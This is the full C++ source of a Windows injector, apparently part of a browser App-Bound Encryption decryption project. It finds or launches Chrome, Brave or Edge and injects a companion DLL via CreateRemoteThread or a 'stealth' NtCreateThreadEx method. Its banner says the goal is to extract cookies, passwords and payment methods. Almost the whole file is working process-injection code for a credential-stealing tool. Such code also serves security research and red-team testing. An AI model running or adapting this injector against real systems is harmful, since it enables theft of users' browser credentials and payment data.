// chrome_inject.cpp
// v0.7.0 (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include <Windows.h>
#include <tlhelp32.h>
#include <VersionHelpers.h>
#include <fstream>
#include <iostream>
#include <string>
#include <string_view>
#include <vector>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <cctype>
#include <cwctype>
#include <algorithm>
#include <optional>
#include <map>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")

const WCHAR *COMPLETION_EVENT_NAME_INJECTOR = L"Global\\ChromeDecryptWorkDoneEvent";
constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
constexpr DWORD BROWSER_INIT_WAIT_MS = 3000;
constexpr DWORD INJECTOR_REMOTE_THREAD_WAIT_MS = 15000;

typedef LONG NTSTATUS;
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

static bool verbose = false;

std::string WStringToUtf8(std::wstring_view w_sv)
{
    if (w_sv.empty())
        return std::string();

    int size_needed = WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), nullptr, 0, nullptr, nullptr);
    if (size_needed == 0)
    {
        return "";
    }

    std::string utf8_str(size_needed, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), &utf8_str[0], size_needed, nullptr, nullptr);
    return utf8_str;
}

inline void debug(const std::string &msg)
{
    if (!verbose)
        return;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN);
    std::cout << "[#] " << msg << std::endl;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

struct HandleGuard
{
    HANDLE h_;
    explicit HandleGuard(HANDLE h = nullptr) : h_((h == INVALID_HANDLE_VALUE) ? nullptr : h)
    {
        if (h_)
        {
            debug("HandleGuard: acquired handle " + std::to_string(reinterpret_cast<uintptr_t>(h_)));
        }
        else if (h == INVALID_HANDLE_VALUE)
        {
            debug("HandleGuard: acquired INVALID_HANDLE_VALUE, stored as null.");
        }
    }
    ~HandleGuard()
    {
        if (h_)
        {
            debug("HandleGuard: closing handle " + std::to_string(reinterpret_cast<uintptr_t>(h_)));
            CloseHandle(h_);
        }
    }
    HANDLE get() const { return h_; }
    void reset(HANDLE h = nullptr)
    {
        if (h_)
            CloseHandle(h_);
        h_ = (h == INVALID_HANDLE_VALUE) ? nullptr : h;
        if (h_)
        {
            debug("HandleGuard: reset handle to " + std::to_string(reinterpret_cast<uintptr_t>(h_)));
        }
        else
        {
            debug("HandleGuard: reset handle to null.");
        }
    }
    explicit operator bool() const { return h_ != nullptr; }

    HandleGuard(const HandleGuard &) = delete;
    HandleGuard &operator=(const HandleGuard &) = delete;
    HandleGuard(HandleGuard &&other) noexcept : h_(other.h_) { other.h_ = nullptr; }
    HandleGuard &operator=(HandleGuard &&other) noexcept
    {
        if (this != &other)
        {
            if (h_)
                CloseHandle(h_);
            h_ = other.h_;
            other.h_ = nullptr;
        }
        return *this;
    }
};

void print_status(const std::string &tag, const std::string &msg)
{
    WORD original_attributes = 0;
    CONSOLE_SCREEN_BUFFER_INFO console_info;
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    if (GetConsoleScreenBufferInfo(hConsole, &console_info))
    {
        original_attributes = console_info.wAttributes;
    }
    else
    {
        original_attributes = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
    }

    WORD col = original_attributes;
    if (tag == "[+]")
        col = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
    else if (tag == "[-]")
        col = FOREGROUND_RED | FOREGROUND_INTENSITY;
    else if (tag == "[*]")
        col = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
    else if (tag == "[WT]")
        col = FOREGROUND_BLUE | FOREGROUND_INTENSITY;
    else if (tag == "[!]")
        col = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;

    SetConsoleTextAttribute(hConsole, col);
    std::cout << tag;
    SetConsoleTextAttribute(hConsole, original_attributes);
    std::cout << " " << msg << std::endl;
}

static const char *ArchName(USHORT m)
{
    switch (m)
    {
    case IMAGE_FILE_MACHINE_I386:
        return "x86";
    case IMAGE_FILE_MACHINE_AMD64:
        return "x64";
    case IMAGE_FILE_MACHINE_ARM64:
        return "ARM64";
    default:
        return "Unknown";
    }
}

constexpr USHORT MyArch =
#if defined(_M_IX86)
    IMAGE_FILE_MACHINE_I386
#elif defined(_M_X64)
    IMAGE_FILE_MACHINE_AMD64
#elif defined(_M_ARM64)
    IMAGE_FILE_MACHINE_ARM64
#else
    IMAGE_FILE_MACHINE_UNKNOWN
#endif
    ;

bool GetProcessArchitecture(HANDLE hProc, USHORT &arch)
{
    auto fnIsWow64Process2 = (decltype(&IsWow64Process2))
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "IsWow64Process2");
    if (fnIsWow64Process2)
    {
        USHORT processMachine = IMAGE_FILE_MACHINE_UNKNOWN;
        USHORT nativeMachine = IMAGE_FILE_MACHINE_UNKNOWN;
        if (!fnIsWow64Process2(hProc, &processMachine, &nativeMachine))
        {
            DWORD lastError = GetLastError();
            debug("IsWow64Process2 call failed. Error: " + std::to_string(lastError));
            return false;
        }
        arch = (processMachine == IMAGE_FILE_MACHINE_UNKNOWN) ? nativeMachine : processMachine;
        debug(std::string("IsWow64Process2: processMachine=") + ArchName(processMachine) + ", nativeMachine=" + ArchName(nativeMachine) + ", effectiveArch=" + ArchName(arch));
        return true;
    }

    BOOL isWow64 = FALSE;
    if (!IsWow64Process(hProc, &isWow64))
    {
        DWORD lastError = GetLastError();
        debug("IsWow64Process call failed. Error: " + std::to_string(lastError));
        return false;
    }

#if defined(_M_X64)
    arch = isWow64 ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_AMD64;
#elif defined(_M_ARM64)
    arch = isWow64 ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_ARM64;
#elif defined(_M_IX86)
    arch = IMAGE_FILE_MACHINE_I386;
    if (isWow64)
    {
        debug("Warning: 32-bit injector and IsWow64Process returned TRUE for target. This is unusual.");
    }
#else
    arch = IMAGE_FILE_MACHINE_UNKNOWN;
    return false;
#endif
    debug(std::string("IsWow64Process: isWow64=") + (isWow64 ? "TRUE" : "FALSE") + ", effectiveArch=" + ArchName(arch));
    return true;
}

bool CheckArchMatch(HANDLE hProc)
{
    USHORT targetArch = IMAGE_FILE_MACHINE_UNKNOWN;
    if (!GetProcessArchitecture(hProc, targetArch))
    {
        print_status("[-]", "Failed to determine target architecture");
        return false;
    }
    if (targetArch != MyArch)
    {
        print_status("[-]",
                     std::string("Architecture mismatch: Injector is ") +
                         ArchName(MyArch) +
                         " but target is " + ArchName(targetArch));
        return false;
    }
    debug("Architecture match: Injector=" + std::string(ArchName(MyArch)) + ", Target=" + std::string(ArchName(targetArch)));
    return true;
}

void DisplayBanner()
{
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);
    std::cout << "------------------------------------------------" << std::endl;
    std::cout << "|  Chrome App-Bound Encryption Decryption      |" << std::endl;
    std::cout << "|  Multi-Method Process Injector               |" << std::endl;
    std::cout << "|  Cookies / Passwords / Payment Methods       |" << std::endl;
    std::cout << "|  v0.7.0 by @xaitax                           |" << std::endl;
    std::cout << "------------------------------------------------" << std::endl
              << std::endl;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
}

void CleanupPreviousRun()
{
    debug("CleanupPreviousRun: attempting to remove temp files");
    char tmp[MAX_PATH];
    DWORD pathLen = GetTempPathA(MAX_PATH, tmp);
    if (pathLen > 0 && pathLen < MAX_PATH)
    {
        std::filesystem::path tempDir(tmp);
        std::filesystem::path logf = tempDir / "chrome_decrypt.log";
        std::filesystem::path keyf = tempDir / "chrome_appbound_key.txt";

        std::error_code ec;
        if (std::filesystem::exists(logf))
        {
            debug("Deleting " + logf.string());
            if (!std::filesystem::remove(logf, ec))
            {
                debug("Failed to delete log file: " + logf.string() + ". Error: " + ec.message());
            }
        }
        else
        {
            debug("Log file not found, no cleanup needed: " + logf.string());
        }

        if (std::filesystem::exists(keyf))
        {
            debug("Deleting " + keyf.string());
            if (!std::filesystem::remove(keyf, ec))
            {
                debug("Failed to delete key file: " + keyf.string() + ". Error: " + ec.message());
            }
        }
        else
        {
            debug("Key file not found, no cleanup needed: " + keyf.string());
        }
    }
    else
    {
        DWORD lastError = GetLastError();
        debug("CleanupPreviousRun: GetTempPathA failed. Error: " + std::to_string(lastError));
    }
}

std::optional<DWORD> GetProcessIdByName(const std::wstring &procName)
{
    debug("GetProcessIdByName: snapshotting processes for " + WStringToUtf8(procName));
    HandleGuard snap(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
    if (!snap)
    {
        DWORD lastError = GetLastError();
        debug("GetProcessIdByName: CreateToolhelp32Snapshot failed. Error: " + std::to_string(lastError));
        return std::nullopt;
    }
    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    if (Process32FirstW(snap.get(), &entry))
    {
        do
        {
            if (procName == entry.szExeFile)
            {
                debug("Found process " + WStringToUtf8(procName) + " PID=" + std::to_string(entry.th32ProcessID));
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snap.get(), &entry));
    }
    else
    {
        DWORD lastError = GetLastError();
        if (lastError != ERROR_NO_MORE_FILES)
        {
            debug("GetProcessIdByName: Process32FirstW failed. Error: " + std::to_string(lastError));
        }
        else
        {
            debug("GetProcessIdByName: No processes found by Process32FirstW or list exhausted.");
        }
    }
    debug("GetProcessIdByName: Process " + WStringToUtf8(procName) + " not found.");
    return std::nullopt;
}

std::string GetDllPath()
{
    namespace fs = std::filesystem;
    wchar_t currentExePathRaw[MAX_PATH];
    DWORD len = GetModuleFileNameW(NULL, currentExePathRaw, MAX_PATH);
    if (len == 0 || (len == MAX_PATH && GetLastError() == ERROR_INSUFFICIENT_BUFFER))
    {
        DWORD lastError = GetLastError();
        debug("GetDllPath: GetModuleFileNameW failed or buffer too small. Error: " + std::to_string(lastError));
        return "";
    }
    fs::path dllPathFs = fs::path(currentExePathRaw).parent_path() / L"chrome_decrypt.dll";
    std::string dllPathStr = dllPathFs.string();
    debug("GetDllPath: DLL path determined as: " + dllPathStr);
    return dllPathStr;
}

bool InjectWithLoadLibrary(HANDLE proc, const std::string &dllPath)
{
    debug("InjectWithLoadLibrary: begin for DLL: " + dllPath);
    SIZE_T size = dllPath.length() + 1;
    debug("VirtualAllocEx size=" + std::to_string(size));
    LPVOID rem = VirtualAllocEx(proc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rem)
    {
        DWORD lastError = GetLastError();
        debug("VirtualAllocEx failed. Error: " + std::to_string(lastError));
        return false;
    }
    debug("WriteProcessMemory of DLL path to remote address: " + std::to_string(reinterpret_cast<uintptr_t>(rem)));
    if (!WriteProcessMemory(proc, rem, dllPath.c_str(), size, nullptr))
    {
        DWORD lastError = GetLastError();
        debug("WriteProcessMemory failed. Error: " + std::to_string(lastError));
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryAddr)
    {
        DWORD lastError = GetLastError();
        debug("GetProcAddress for LoadLibraryA failed. Error: " + std::to_string(lastError));
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    debug("Calling CreateRemoteThread with LoadLibraryA at " + std::to_string(reinterpret_cast<uintptr_t>(loadLibraryAddr)));
    HandleGuard th(CreateRemoteThread(proc, nullptr, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, rem, 0, nullptr));
    if (!th)
    {
        DWORD lastError = GetLastError();
        debug("CreateRemoteThread failed. Error: " + std::to_string(lastError));
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    debug("Waiting for remote LoadLibraryA thread to complete (max " + std::to_string(INJECTOR_REMOTE_THREAD_WAIT_MS / 1000) + "s)...");
    DWORD wait_res = WaitForSingleObject(th.get(), INJECTOR_REMOTE_THREAD_WAIT_MS);
    if (wait_res == WAIT_TIMEOUT)
    {
        debug("Remote LoadLibraryA thread timed out.");
    }
    else if (wait_res == WAIT_OBJECT_0)
    {
        debug("Remote LoadLibraryA thread finished.");
    }
    else
    {
        DWORD lastError = GetLastError();
        debug("WaitForSingleObject on LoadLibraryA thread failed. Error: " + std::to_string(lastError));
    }

    VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
    debug("InjectWithLoadLibrary: done");
    return (wait_res == WAIT_OBJECT_0);
}

using pNtCreateThreadEx = NTSTATUS(NTAPI *)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList);

bool InjectWithNtCreateThreadEx(HANDLE proc, const std::string &dllPath)
{
    debug("InjectWithNtCreateThreadEx: begin for DLL: " + dllPath);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
    {
        DWORD lastError = GetLastError();
        debug("GetModuleHandleW for ntdll.dll failed. Error: " + std::to_string(lastError));
        return false;
    }
    debug(std::string("ntdll.dll base=") + std::to_string(reinterpret_cast<uintptr_t>(ntdll)));
    auto fnNtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    if (!fnNtCreateThreadEx)
    {
        DWORD lastError = GetLastError();
        debug("GetProcAddress NtCreateThreadEx failed. Error: " + std::to_string(lastError));
        return false;
    }
    debug(std::string("NtCreateThreadEx addr=") + std::to_string(reinterpret_cast<uintptr_t>(fnNtCreateThreadEx)));

    SIZE_T size = dllPath.length() + 1;
    debug("VirtualAllocEx size=" + std::to_string(size));
    LPVOID rem = VirtualAllocEx(proc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rem)
    {
        DWORD lastError = GetLastError();
        debug("VirtualAllocEx failed. Error: " + std::to_string(lastError));
        return false;
    }
    if (!WriteProcessMemory(proc, rem, dllPath.c_str(), size, nullptr))
    {
        DWORD lastError = GetLastError();
        debug("WriteProcessMemory failed. Error: " + std::to_string(lastError));
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    debug("WriteProcessMemory complete for DLL path to remote address: " + std::to_string(reinterpret_cast<uintptr_t>(rem)));

    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryAddr)
    {
        DWORD lastError = GetLastError();
        debug("GetProcAddress for LoadLibraryA failed. Error: " + std::to_string(lastError));
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    debug("Calling NtCreateThreadEx with LoadLibraryA at " + std::to_string(reinterpret_cast<uintptr_t>(loadLibraryAddr)));

    HANDLE thr = nullptr;
    NTSTATUS st = fnNtCreateThreadEx(&thr, THREAD_ALL_ACCESS, nullptr, proc,
                                     loadLibraryAddr, rem,
                                     0, 0, 0, 0, nullptr);

    HandleGuard remoteThreadHandle(thr);

    debug(std::string("NtCreateThreadEx returned status ") + std::to_string(st) + std::string(", thread handle=") + std::to_string(reinterpret_cast<uintptr_t>(remoteThreadHandle.get())));
    if (!NT_SUCCESS(st) || !remoteThreadHandle)
    {
        std::ostringstream oss;
        oss << "NtCreateThreadEx failed or returned null thread handle. NTSTATUS: 0x" << std::hex << st;
        debug(oss.str());
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    debug("Waiting for remote LoadLibraryA thread (NtCreateThreadEx) to complete (max " + std::to_string(INJECTOR_REMOTE_THREAD_WAIT_MS / 1000) + "s)...");
    DWORD wait_res = WaitForSingleObject(remoteThreadHandle.get(), INJECTOR_REMOTE_THREAD_WAIT_MS);
    if (wait_res == WAIT_TIMEOUT)
    {
        debug("Remote LoadLibraryA thread (NtCreateThreadEx) timed out.");
    }
    else if (wait_res == WAIT_OBJECT_0)
    {
        debug("Remote LoadLibraryA thread (NtCreateThreadEx) finished.");
    }
    else
    {
        DWORD lastError = GetLastError();
        debug("WaitForSingleObject on LoadLibraryA thread (NtCreateThreadEx) failed. Error: " + std::to_string(lastError));
    }

    VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
    debug("InjectWithNtCreateThreadEx: done");
    return (wait_res == WAIT_OBJECT_0);
}

struct BrowserDetails
{
    std::wstring processName;
    std::wstring defaultExePath;
};

const std::map<std::wstring, BrowserDetails> browserConfigMap = {
    {L"chrome", {L"chrome.exe", L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"}},
    {L"brave", {L"brave.exe", L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}},
    {L"edge", {L"msedge.exe", L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"}}};

bool StartBrowserAndWait(const std::wstring &exePath, DWORD &outPid)
{
    std::string cmd = WStringToUtf8(exePath);
    debug("StartBrowserAndWait: attempting to launch: " + cmd);
    STARTUPINFOW si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    if (!CreateProcessW(exePath.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi))
    {
        DWORD lastError = GetLastError();
        debug("CreateProcessW failed for " + cmd + ". Error: " + std::to_string(lastError));
        return false;
    }
    HandleGuard processHandle(pi.hProcess);
    HandleGuard threadHandle(pi.hThread);

    debug("Browser main thread handle: " + std::to_string(reinterpret_cast<uintptr_t>(pi.hThread)));
    debug("Browser process handle: " + std::to_string(reinterpret_cast<uintptr_t>(pi.hProcess)));

    debug("Waiting " + std::to_string(BROWSER_INIT_WAIT_MS / 1000) + "s for browser to initialize...");
    Sleep(BROWSER_INIT_WAIT_MS);

    outPid = pi.dwProcessId;
    debug("Browser started PID=" + std::to_string(outPid));
    return true;
}

int wmain(int argc, wchar_t *argv[])
{
    DisplayBanner();
    std::string injectionMethodStr = "load";
    bool autoStartBrowser = false;
    bool browserSuccessfullyStartedByInjector = false;
    std::wstring browserTypeArg;

    debug("wmain: parsing arguments");
    for (int i = 1; i < argc; ++i)
    {
        std::wstring_view arg = argv[i];
        if ((arg == L"--method" || arg == L"-m") && i + 1 < argc)
        {
            std::wstring_view method_val_sv = argv[++i];
            injectionMethodStr = WStringToUtf8(method_val_sv);
            std::transform(injectionMethodStr.begin(), injectionMethodStr.end(), injectionMethodStr.begin(),
                           [](unsigned char c_char)
                           { return static_cast<char>(std::tolower(c_char)); });
            debug("Injection method set to: " + injectionMethodStr);
        }
        else if (arg == L"--start-browser" || arg == L"-s")
        {
            autoStartBrowser = true;
            debug("Auto-start browser enabled.");
        }
        else if (arg == L"--verbose" || arg == L"-v")
        {
            verbose = true;
            std::cout << "[#] Verbose mode enabled." << std::endl;
        }
        else if (browserTypeArg.empty() && !arg.empty() && arg[0] != L'-')
        {
            browserTypeArg = arg;
            std::transform(browserTypeArg.begin(), browserTypeArg.end(), browserTypeArg.begin(),
                           [](wchar_t wc)
                           { return static_cast<wchar_t>(std::towlower(wc)); });
            debug("Browser type argument: " + WStringToUtf8(browserTypeArg));
        }
        else
        {
            print_status("[!]", "Unknown or misplaced argument: " + WStringToUtf8(arg));
        }
    }

    if (browserTypeArg.empty())
    {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);
        std::wcout << L"Usage:\n"
                   << L"  chrome_inject.exe [options] <chrome|brave|edge>\n\n"
                   << L"Options:\n"
                   << L"  --method|-m load|nt    Injection method (default: load)\n"
                   << L"  --start-browser|-s     Auto-launch browser if not running\n"
                   << L"  --verbose|-v           Enable verbose debug output\n";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
        return 1;
    }

    CleanupPreviousRun();

    HandleGuard completionEvent(CreateEventW(NULL, TRUE, FALSE, COMPLETION_EVENT_NAME_INJECTOR));
    if (!completionEvent)
    {
        DWORD lastError = GetLastError();
        print_status("[-]", "Failed to create completion event. Error: " + std::to_string(lastError));
        return 1;
    }
    debug("Created completion event: " + WStringToUtf8(COMPLETION_EVENT_NAME_INJECTOR));
    ResetEvent(completionEvent.get());

    auto browserIt = browserConfigMap.find(browserTypeArg);
    if (browserIt == browserConfigMap.end())
    {
        print_status("[-]", "Unsupported browser type: " + WStringToUtf8(browserTypeArg));
        return 1;
    }
    const BrowserDetails &currentBrowserInfo = browserIt->second;
    std::string browserDisplayName = WStringToUtf8(browserTypeArg);
    if (!browserDisplayName.empty())
        browserDisplayName[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(browserDisplayName[0])));

    debug("Target: " + browserDisplayName + ", Process: " + WStringToUtf8(currentBrowserInfo.processName) + ", Default Exe: " + WStringToUtf8(currentBrowserInfo.defaultExePath));

    DWORD targetPid = 0;
    if (auto optPid = GetProcessIdByName(currentBrowserInfo.processName))
    {
        targetPid = *optPid;
    }

    if (targetPid == 0 && autoStartBrowser)
    {
        print_status("[*]", browserDisplayName + " not running, launching...");
        if (StartBrowserAndWait(currentBrowserInfo.defaultExePath, targetPid))
        {
            browserSuccessfullyStartedByInjector = true;
            std::string versionStr = "N/A";
            debug("Retrieving version info for: " + WStringToUtf8(currentBrowserInfo.defaultExePath));
            DWORD versionHandleUnused = 0;
            DWORD versionInfoSize = GetFileVersionInfoSizeW(currentBrowserInfo.defaultExePath.c_str(), &versionHandleUnused);
            if (versionInfoSize > 0)
            {
                std::vector<BYTE> versionData(versionInfoSize);
                if (GetFileVersionInfoW(currentBrowserInfo.defaultExePath.c_str(), versionHandleUnused, versionInfoSize, versionData.data()))
                {
                    UINT ffiLen = 0;
                    VS_FIXEDFILEINFO *ffi = nullptr;
                    if (VerQueryValueW(versionData.data(), L"\\", (LPVOID *)&ffi, &ffiLen) && ffi)
                    {
                        versionStr = std::to_string(HIWORD(ffi->dwProductVersionMS)) + "." +
                                     std::to_string(LOWORD(ffi->dwProductVersionMS)) + "." +
                                     std::to_string(HIWORD(ffi->dwProductVersionLS)) + "." +
                                     std::to_string(LOWORD(ffi->dwProductVersionLS));
                        debug("Version query successful: " + versionStr);
                    }
                    else
                    {
                        debug("VerQueryValueW failed. Error: " + std::to_string(GetLastError()));
                    }
                }
                else
                {
                    debug("GetFileVersionInfoW failed. Error: " + std::to_string(GetLastError()));
                }
            }
            else
            {
                debug("GetFileVersionInfoSizeW failed or returned 0. Error: " + std::to_string(GetLastError()));
            }
            print_status("[+]", browserDisplayName + " (v. " + versionStr + ") launched w/ PID " + std::to_string(targetPid));
        }
        else
        {
            print_status("[-]", "Failed to start " + browserDisplayName);
            return 1;
        }
    }
    if (targetPid == 0)
    {
        print_status("[-]", browserDisplayName + " not running and auto-start not requested or failed.");
        return 1;
    }

    std::string injectionMethodDesc = (injectionMethodStr == "nt") ? "NtCreateThreadEx stealth" : "CreateRemoteThread + LoadLibraryA";

    debug("Opening process PID=" + std::to_string(targetPid));
    HandleGuard targetProcessHandle(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPid));
    if (!targetProcessHandle)
    {
        DWORD lastError = GetLastError();
        print_status("[-]", "OpenProcess failed for PID " + std::to_string(targetPid) + ". Error: " + std::to_string(lastError));
        return 1;
    }
    if (!CheckArchMatch(targetProcessHandle.get()))
        return 1;

    std::string dllPath = GetDllPath();
    if (dllPath.empty() || !std::filesystem::exists(dllPath))
    {
        print_status("[-]", "chrome_decrypt.dll not found or path could not be determined. Expected near: " + (dllPath.empty() ? "<Error getting path>" : dllPath));
        return 1;
    }
    debug("DLL path: " + dllPath);

    bool injectedSuccessfully = false;
    if (injectionMethodStr == "nt")
    {
        injectedSuccessfully = InjectWithNtCreateThreadEx(targetProcessHandle.get(), dllPath);
    }
    else if (injectionMethodStr == "load")
    {
        injectedSuccessfully = InjectWithLoadLibrary(targetProcessHandle.get(), dllPath);
    }
    else
    {
        print_status("[-]", "Unknown injection method specified: " + injectionMethodStr);
        return 1;
    }

    if (!injectedSuccessfully)
    {
        print_status("[-]", "DLL injection failed via " + injectionMethodDesc);
        return 1;
    }
    print_status("[+]", "DLL injected via " + injectionMethodDesc);

    print_status("[*]", "Waiting for DLL decryption tasks to complete (max " + std::to_string(DLL_COMPLETION_TIMEOUT_MS / 1000) + "s)...");
    DWORD waitResult = WaitForSingleObject(completionEvent.get(), DLL_COMPLETION_TIMEOUT_MS);

    if (waitResult == WAIT_OBJECT_0)
    {
        print_status("[+]", "DLL signaled completion.");
    }
    else if (waitResult == WAIT_TIMEOUT)
    {
        print_status("[-]", "Timeout waiting for DLL completion. Log may be incomplete or DLL failed.");
    }
    else
    {
        DWORD lastError = GetLastError();
        print_status("[-]", "Error waiting for DLL completion event: " + std::to_string(lastError));
    }

    char tempPathCStr[MAX_PATH];
    DWORD tempPathLen = GetTempPathA(MAX_PATH, tempPathCStr);
    if (tempPathLen > 0 && tempPathLen < MAX_PATH)
    {
        std::filesystem::path logFilePath = std::filesystem::path(tempPathCStr) / "chrome_decrypt.log";
        debug("Attempting to display log file: " + logFilePath.string());

        std::ifstream ifs(logFilePath);
        if (ifs.is_open())
        {
            std::string line;

            CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
            HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
            WORD originalAttributes = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
            if (GetConsoleScreenBufferInfo(hStdOut, &consoleInfo))
            {
                originalAttributes = consoleInfo.wAttributes;
            }

            while (std::getline(ifs, line))
            {
                size_t currentPos = 0;
                while (currentPos < line.length())
                {
                    size_t tagStartPos = line.find('[', currentPos);

                    SetConsoleTextAttribute(hStdOut, originalAttributes);
                    std::cout << line.substr(currentPos, tagStartPos - currentPos);

                    if (tagStartPos == std::string::npos)
                        break;

                    size_t tagEndPos = line.find(']', tagStartPos);
                    if (tagEndPos == std::string::npos)
                    {
                        std::cout << line.substr(tagStartPos);
                        break;
                    }

                    std::string tag = line.substr(tagStartPos, tagEndPos - tagStartPos + 1);

                    WORD currentTagColor = originalAttributes;
                    if (tag == "[+]")
                        currentTagColor = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
                    else if (tag == "[-]")
                        currentTagColor = FOREGROUND_RED | FOREGROUND_INTENSITY;
                    else if (tag == "[*]")
                        currentTagColor = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
                    else if (tag == "[WT]")
                        currentTagColor = FOREGROUND_BLUE | FOREGROUND_INTENSITY;
                    else if (tag == "[!]")
                        currentTagColor = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;

                    SetConsoleTextAttribute(hStdOut, currentTagColor);
                    std::cout << tag;
                    currentPos = tagEndPos + 1;
                }
                SetConsoleTextAttribute(hStdOut, originalAttributes);
                std::cout << std::endl;
            }
            ifs.close();
        }
        else
        {
            debug("Log file not found or could not be opened: " + logFilePath.string());
            print_status("[!]", "Log file from DLL was not found or is empty.");
        }

        if (browserSuccessfullyStartedByInjector)
        {
            debug("Terminating browser PID=" + std::to_string(targetPid) + " because injector started it.");
            HandleGuard processToKillHandle(OpenProcess(PROCESS_TERMINATE, FALSE, targetPid));
            if (processToKillHandle)
            {
                if (TerminateProcess(processToKillHandle.get(), 0))
                {
                    print_status("[*]", browserDisplayName + " terminated by injector.");
                }
                else
                {
                    DWORD lastError = GetLastError();
                    print_status("[-]", "Failed to terminate " + browserDisplayName + ". Error: " + std::to_string(lastError));
                }
            }
            else
            {
                DWORD lastError = GetLastError();
                print_status("[-]", "Failed to open " + browserDisplayName + " for termination (it might have already exited). Error: " + std::to_string(lastError));
            }
        }
        else
        {
            debug("Browser was already running; injector will not terminate it.");
        }
    }
    else
    {
        DWORD lastError = GetLastError();
        print_status("[-]", "GetTempPathA failed. Error: " + std::to_string(lastError));
    }
    debug("Injector finished.");
    return 0;
}